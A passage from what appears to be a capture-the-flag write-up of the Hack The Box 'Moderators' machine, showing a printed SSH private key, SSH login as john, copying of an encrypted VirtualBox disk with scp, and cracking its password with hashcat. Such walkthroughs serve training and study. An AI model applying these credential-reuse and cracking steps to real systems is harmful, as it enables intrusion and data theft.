</span></span><span style="display:flex;"><span>KOQL5eDDOoKguamrm3biwAYbBF35awAAAAMBAAEAAAGBAJsfhQ2AvIZGvPp2e5ipXdY/Qc
</span></span><span style="display:flex;"><span>h+skUeiR7cUN+IJ4mU0Fj6DiQM77+Vks+WoAU6dkBhgAmW6G9BHXw8hZPHwddmHSg5NdWI
</span></span><span style="display:flex;"><span>VTvEdq/NCnUdoVGmnKcAf4HSS0akKLMWgoQO/Dsa/yKIGzauUNYdcbEzy5P6W0Ehh7YTB5
</span></span><span style="display:flex;"><span>mE+FaLB/Qi0Vni0wgTxTj2TAipp9aj+N1/pLDY4yxeloIZmf8HhuR1TY/tmNWGlpenni6g
</span></span><span style="display:flex;"><span>kki/0Fb2nGuFV9VIlzCI6s7++ARLTUysVDhCB0H5Urxey4Ynxu9NWejsf6QAZibAZSb6il
</span></span><span style="display:flex;"><span>uerZYKiiJD0pmDBY1ApJhNE+tafeIeX1EyPgq9yGKUXZEI1VE0rITGbpHPjYAnn7yhLDQ9
</span></span><span style="display:flex;"><span>rcrFW/SaR80ulolwQRm+4J8TEHAVYGzshNZ2tvrYDVGOT/OvFObOK7kRHHKJBVL6I96htc
</span></span><span style="display:flex;"><span>vSzN5qGw3+I7YJKTrXJwJ5vEjjelmyK82FXquUcubMTW6/B72QNW7zjRgLGGObpWWV+QAA
</span></span><span style="display:flex;"><span>AMAE4VjUADP53GgSVYpLBnR+69RVBqc5h3U3D6zButs/m7xsMoIoBrkv342fsK4qkBYWFU
</span></span><span style="display:flex;"><span>sdCOXDQUGYcVdzXKwzRsKslGOAnyeRsg9wYsVhcc1YSWIJZBdBIaqPBKcfsVGUM88icxqk
</span></span><span style="display:flex;"><span>Qn6CEN4Bwy0ZgB/SAXMMU8IQHtcfZQFeiByg0/XRlvZuQay6Cw6/406dlzTJDmzGzkzX08
</span></span><span style="display:flex;"><span>4V8F7PfPJ2oSs6c813vv6B1iKw1Ii9qAmPqBFC83rwnCjs+Q0AAADBANUfGWc7YgCVG5SO
</span></span><span style="display:flex;"><span>u89ba4uO4wZ/zpbHog7cs1flldkrtDZluiqWWopTAKpnsD2CXSxoZ7cWdPytJeuElvlRmY
</span></span><span style="display:flex;"><span>aUUrjaj2WFdNLgMjFb4jZeEcI3lz8BeRSTiXUSbLA4SxVLeSizZx8g1SNVAlE5VwUWZVYo
</span></span><span style="display:flex;"><span>6ge465sU/c54jAxW2X2yioPCPdYVEpOTTZr40mg94/Zycxlbd8+L1jaepLqvXq5K4lSXPr
</span></span><span style="display:flex;"><span>PoZ/w+K9mf5912RGlmSzBARVUyCqquLQAAAMEAwCGwEI9KR0zmcnfhGiQviWObgAUEDA7h
</span></span><span style="display:flex;"><span>HxJn61h6sI0SsFOCatx9Q+a7sbKeVqQdph8Rn5rInzQ7TpvflHsrGzvU0ZpZ0Ys2928pN7
</span></span><span style="display:flex;"><span>So+Bt6jTiNTXdD24/FmZbxn/BXLovEJpeT2L3V3kvabJAHhSykFP0+Q0dlNDmQxuMQ+muO
</span></span><span style="display:flex;"><span>FQGVHxktaFKkrEl71gqoHPll8zNwNY9BjpxFPy48B1RgkxkfHSNZ8ujSI6Wse3tX6T03HD
</span></span><span style="display:flex;"><span>fotkBDyCmCDxz3AAAAD2pvaG5AbW9kZXJhdG9ycwECAw<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> john_id_rsa
</span></span><span style="display:flex;"><span>$ ssh -i john_id_rsa john@10.10.11.173
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>john@moderators:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>john<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>moderators<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="post-enumeration-as-john">Post Enumeration As John</h2>
<p>In john&rsquo;s home diretory, there are some export message files generated from <em>Whatsapp</em>, and looks like john is storing some interesting messages:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ cat stuff/exp/2021-09-*
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>9/15/21, 23:55 - Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.
</span></span><span style="display:flex;"><span>9/19/21, 00:39 - JOHN MILLER: Hey mate
</span></span><span style="display:flex;"><span>9/19/21, 00:39 - JOHN MILLER: Are u free?
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - CARTOR BAIL: Yeah yeah
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - JOHN MILLER: I did what you said
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - JOHN MILLER: I copied all the VM files
</span></span><span style="display:flex;"><span>9/19/21, 00:41 - CARTOR BAIL: Nice
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - CARTOR BAIL: Wait
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - CARTOR BAIL: What is the extension of tge file
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - JOHN MILLER: .vbox
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - JOHN MILLER: Why?
</span></span><span style="display:flex;"><span>9/19/21, 00:42 - JOHN MILLER: That<span style="color:#e6db74">&#39;s the correct one ryt?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:42 - CARTOR BAIL: U idiot😂
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: Naah thats not the file you need.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: Right one is something like .vdi or .vdmk
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - JOHN MILLER: Oh shoot😅
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - JOHN MILLER: My bad
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: U have vmware ryt?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - JOHN MILLER: Nope virtual box
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:43 - CARTOR BAIL: oh then most of the time it should be .vdi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:44 - JOHN MILLER: Ah kk
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:44 - CARTOR BAIL: U know, I miss the old Sysadmin john. He was funny and stupid at the same time. ;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9/19/21, 00:44 - JOHN MILLER: Hahaha real funny. But it&#39;</span>s kinda true though.
</span></span><span style="display:flex;"><span>9/19/21, 00:44 - CARTOR BAIL: Doing reboots at the deployement, Calling our clinet bro, using the same dubmb password... God I miss those days. 
</span></span><span style="display:flex;"><span>9/19/21, 00:44 - JOHN MILLER: Okay Okay, I was stupid back <span style="color:#66d9ef">then</span>, not now. Btw I have a promotion comming up. 
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>John have copied some VM files, so I&rsquo;ll take a look at them:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ ls -la stuff/VBOX/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">118800</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> john john      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> john john      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> john john      <span style="color:#ae81ff">5705</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> 2019-08-01.vbox
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> john john <span style="color:#ae81ff">121634816</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> 2019.vdi
</span></span></code></pre></div><p>Using <em>scp</em> I&rsquo;ll copy them to my machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ scp -i john_id_rsa john@10.10.11.173:/home/john/stuff/VBOX/2019-08-01.vbox ./www/VBOX/
</span></span><span style="display:flex;"><span>$ scp -i john_id_rsa john@10.10.11.173:/home/john/stuff/VBOX/2019.vdi ./www/VBOX/
</span></span></code></pre></div><ul>
<li>Additional resources:
<ul>
<li><em>Virtual Disk Image (.vdi)</em> files are disk files specific to virtual box program (usually data is stored in these files) (

<a href="https://docs.fileformat.com/disc-and-media/vdi/%29" target="_blank">https://docs.fileformat.com/disc-and-media/vdi/)</a>. These files can be attached to any virual machine, and will be recognized as a new disk. For example, I can attach this image to my kali machine, and kali will recognize it as a new drive that can be mounted and accessed.</li>
<li><em>.VBOX</em> files are files where settings and configuration for virtual machines are stored (

<a href="https://fileinfo.com/extension/vbox%29" target="_blank">https://fileinfo.com/extension/vbox)</a>.</li>
</ul>
</li>
</ul>
<h2 id="inspecting-vm-files">Inspecting VM Files</h2>
<p>By inspecting the <em>.vbox</em> file, I noticed that the <em>2019.vdi</em> is encrypted, and that it is part of Ubuntu 22 Desktop virtual machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;MediaRegistry&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardDisk</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{12b147da-5b2d-471f-9e32-a32b1517ff4b}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;F:/2019.vdi&#34;</span> <span style="color:#a6e22e">format=</span><span style="color:#e6db74">&#34;VDI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Normal&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyId&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Moderator 1&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyStore&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&amp;#13;&amp;#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&amp;#13;&amp;#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&amp;#13;&amp;#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&amp;#13;&amp;#10;gwC6MrGLZFhl1g==&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/HardDisk&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardDisk</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{5999a8f0-e31d-4d4e-937d-173eb6ba8881}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;Ubuntu.vdi&#34;</span> <span style="color:#a6e22e">format=</span><span style="color:#e6db74">&#34;VDI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Normal&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;DVDImages&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Image</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{7653d755-c513-4004-8891-be83fc130dba}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;F:/ubuntu-22.04-desktop-amd64.iso&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/DVDImages&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/MediaRegistry&gt;</span>
</span></span></code></pre></div><ul>
<li>Inside <em>&lt;HardDisks&gt;&lt;/HardDisks&gt;</em> tags there are two <em>.vdi</em> images, <em>2019.vdi</em> and <em>Ubuntu.vdi</em></li>
<li>Inside <em>&lt;DVDImages&gt;&lt;/DVDImages&gt;</em> tags is stored the <em>.iso</em> image, in this case is <em>ubuntu-22.04-desktop-amd64.iso</em></li>
</ul>
<p>From these 2 <em>.vdi</em> images I only have <em>2019.vdi</em> image, and because John&rsquo;s silly mistake (as said in the previous messages, he copied the wrong file), I was able to get the <em>.vbox</em> file where the hash of this image is stored, which means that I can now try to crack it and see if I am able to find some interesting information inside it.</p>
<h3 id="cracking-vdi-file">Cracking VDI File</h3>
<p>Before cracking <em>2019.vdi</em>&rsquo;s encryption, I need to convert virtual box hash to a hash that <em>hashcat</em> understands, using 

<a href="https://github.com/hashcat/hashcat/blob/master/tools/virtualbox2hashcat.py" target="_blank"><em>virtualbox2hashcat.py</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/hashcat/tools/virtualbox2hashcat.py --vbox 2019-08-01.vbox 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
</span></span></code></pre></div><p>Then, I&rsquo;ll use 

<a href="https://github.com/hashcat/hashcat/blob/master/example.dict" target="_blank"><em>example.dict</em></a> file from hashcat as wordlist to crack it:</p>
<ul>
<li>This hash is <em>VirtualBox PBKDF2-HMAC-SHA256 &amp; AES-256-XTS</em>, of <em>mode 27600</em>, but if you&rsquo;re not sure you can let hashcat&rsquo;s new feature &ldquo;<em>auto detect</em>&rdquo; decide what it is.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">27600</span> $vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f example.dict
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f:computer
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h3 id="decrypt-vdi-file-and-attach-it-to-kali">Decrypt VDI File And Attach It To Kali</h3>
<p>The password is <em>computer</em>. I can now attach this file to my kali machine in virtual box.</p>
<p>To do that, first I need to modify the <em>.vbox</em> file, and remove any entry that maps to either <em>Ubuntu.vdi</em> or <em>ubuntu-22.04-desktop-amd64.iso</em>, since I don&rsquo;t have any of them, and modify the <em>location=&ldquo;F:/2019.vdi&rdquo;</em> to the location where <em>2019.vdi</em> is located (Use <em>/</em> instead of <em>\</em> for the path, even if you&rsquo;re on windows).</p>
<ul>
<li>
<p>This is done to let VirtualBox decrypt the file before attaching it to kali.</p>
</li>
<li>
<p>The new file will be like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** DO NOT EDIT THIS FILE.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** If you make changes to this file while any VirtualBox related application
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** is running, your changes will be overwritten later, without taking effect.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Use VBoxManage or the VirtualBox Manager GUI to make changes.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;VirtualBox</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.virtualbox.org/&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.16-windows&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;Machine</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{528b3540-b8be-4677-b43f-7f4969137747}&#34;</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Moderator 1&#34;</span> <span style="color:#a6e22e">OSType=</span><span style="color:#e6db74">&#34;Ubuntu_64&#34;</span> <span style="color:#a6e22e">snapshotFolder=</span><span style="color:#e6db74">&#34;Snapshots&#34;</span> <span style="color:#a6e22e">lastStateChange=</span><span style="color:#e6db74">&#34;2021-09-15T16:44:57Z&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;MediaRegistry&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardDisk</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{12b147da-5b2d-471f-9e32-a32b1517ff4b}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;[Path To VDI]/2019.vdi&#34;</span> <span style="color:#a6e22e">format=</span><span style="color:#e6db74">&#34;VDI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Normal&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyId&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Moderator 1&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyStore&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&amp;#13;&amp;#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&amp;#13;&amp;#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&amp;#13;&amp;#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&amp;#13;&amp;#10;gwC6MrGLZFhl1g==&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/HardDisk&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/MediaRegistry&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;ExtraData&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/Fullscreen&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/LastCloseAction&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;PowerOff&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/LastGuestSizeHint&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;2560,1335&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/LastNormalWindowPosition&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;0,23,2560,1377,max&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/ExtraData&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Hardware&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;CPU</span> <span style="color:#a6e22e">count=</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;PAE</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;LongMode</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;X2APIC</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardwareVirtExLargePages</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/CPU&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Memory</span> <span style="color:#a6e22e">RAMSize=</span><span style="color:#e6db74">&#34;6025&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HID</span> <span style="color:#a6e22e">Pointing=</span><span style="color:#e6db74">&#34;USBTablet&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Boot&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;Floppy&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;HardDisk&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;DVD&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;4&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;None&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/Boot&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Display</span> <span style="color:#a6e22e">controller=</span><span style="color:#e6db74">&#34;VMSVGA&#34;</span> <span style="color:#a6e22e">VRAMSize=</span><span style="color:#e6db74">&#34;128&#34;</span> <span style="color:#a6e22e">accelerate3D=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;VideoCapture</span> <span style="color:#a6e22e">screens=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">file=</span><span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#a6e22e">fps=</span><span style="color:#e6db74">&#34;25&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;BIOS&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;IOAPIC</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;SmbiosUuidLittleEndian</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/BIOS&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;USB&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Controllers&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Controller</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;OHCI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;OHCI&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Controller</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;EHCI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;EHCI&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Controllers&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/USB&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Network&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Adapter</span> <span style="color:#a6e22e">slot=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#a6e22e">MACAddress=</span><span style="color:#e6db74">&#34;08002799F7EC&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;82540EM&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;NAT/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Adapter&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/Network&gt;</span>
